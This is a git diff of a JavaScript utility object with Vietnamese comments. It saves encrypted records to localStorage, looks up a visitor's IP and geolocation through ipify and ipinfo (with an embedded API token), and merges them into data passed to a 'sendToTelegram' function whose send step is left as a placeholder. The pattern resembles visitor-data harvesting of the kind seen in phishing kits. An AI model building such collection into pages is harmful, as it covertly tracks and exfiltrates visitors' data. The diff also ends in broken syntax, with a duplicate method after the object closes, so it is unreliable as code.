@@ -12,66 +12,150 @@ const Utils = {
     saveRecord(key, value) {
         try {
             const encryptedValue = this.encrypt(JSON.stringify(value));
-            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
+            const record = {
+                value: encryptedValue,
+                expiry: Date.now() + CONFIG.STORAGE_EXPIRY
+            };
+
             localStorage.setItem(key, JSON.stringify(record));
         } catch (error) {
-            console.error('Save error:', error);
+            console.error("Save error:", error);
         }
     },
 
     getRecord(key) {
         try {
             const item = localStorage.getItem(key);
+
             if (!item) return null;
+
             const { value, expiry } = JSON.parse(item);
+
             if (Date.now() > expiry) {
                 localStorage.removeItem(key);
                 return null;
             }
+
             const decrypted = this.decrypt(value);
+
             return decrypted ? JSON.parse(decrypted) : null;
+
         } catch (error) {
+            console.error("Get record error:", error);
             return null;
         }
     },
 
+    // Lấy IP độc lập
     async getUserIp() {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
+            const response = await fetch(
+                "https://api.ipify.org?format=json",
+                {
+                    method: "GET",
+                    cache: "no-store"
+                }
+            );
+
+            if (!response.ok) {
+                throw new Error("IP API error: " + response.status);
+            }
+
             const data = await response.json();
-            return data.ip;
+
+            return data && data.ip ? data.ip : "N/A";
+
         } catch (error) {
-            console.error('Error getting IP:', error);
-            return 'N/A';
+            console.error("Error getting IP:", error);
+            return "N/A";
         }
     },
 
+    // Lấy thông tin IP + Location
     async getUserLocation() {
+        let ip = "N/A";
+        let city = "N/A";
+        let region = "N/A";
+        let country = "N/A";
+        let countryCode = "N/A";
+
         try {
-            const response = await fetch("https://ipinfo.io/json?token=5a58a2d85996e3");
-            if (!response.ok) throw new Error("Network response was not ok");
+            // Luôn thử lấy IP trước
+            ip = await this.getUserIp();
 
-            const data = await response.json();
+            // Sau đó lấy thông tin vị trí
+            const response = await fetch(
+                "https://ipinfo.io/json?token=5a58a2d85996e3",
+                {
+                    method: "GET",
+                    cache: "no-store"
+                }
+            );
 
-            return {
-                location: `${data.ip} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country})`,
-                country_code: data.country || "N/A",
-                ip: data.ip || "N/A",
-                region: data.region || "N/A",
-                country: data.country || "N/A"   // hoặc data.org nếu muốn ISP
-            };
+            if (response.ok) {
+                const data = await response.json();
+
+                // Nếu IPInfo có IP thì ưu tiên IPInfo
+                if (data.ip) {
+                    ip = data.ip;
+                }
+
+                city = data.city || "N/A";
+                region = data.region || "N/A";
+                countryCode = data.country || "N/A";
+                country = data.country || "N/A";
+            }
+
         } catch (error) {
             console.error("Error getting location:", error);
-
-            return {
-                location: "N/A",
-                country_code: "N/A",
-                ip: "N/A",
-                region: "N/A",
-                country: "N/A"
-            };
         }
+
+        // Tạo Location không bao giờ bị "N/A)"
+        let locationParts = [];
+
+        if (city !== "N/A") {
+            locationParts.push(city);
+        }
+
+        if (region !== "N/A") {
+            locationParts.push(region);
+        }
+
+        if (country !== "N/A") {
+            locationParts.push(country);
+        }
+
+        const location =
+            locationParts.length > 0
+                ? locationParts.join(" | ")
+                : "N/A";
+
+        return {
+            location: location,
+            country_code: countryCode,
+            ip: ip,
+            region: region,
+            country: country
+        };
     },
+
+    async sendToTelegram(data) {
+        const locationData = await this.getUserLocation();
+
+        // Gộp dữ liệu
+        const telegramData = {
+            ...data,
+            ip: locationData.ip,
+            location: locationData.location,
+            country_code: locationData.country_code,
+            region: locationData.region,
+            country: locationData.country
+        };
+
+        // Phần gửi Telegram của bạn đặt tiếp ở đây
+        // ...
+    }
+};
 
     async sendToTelegram(data) {
         const locationData = await this.getUserLocation();
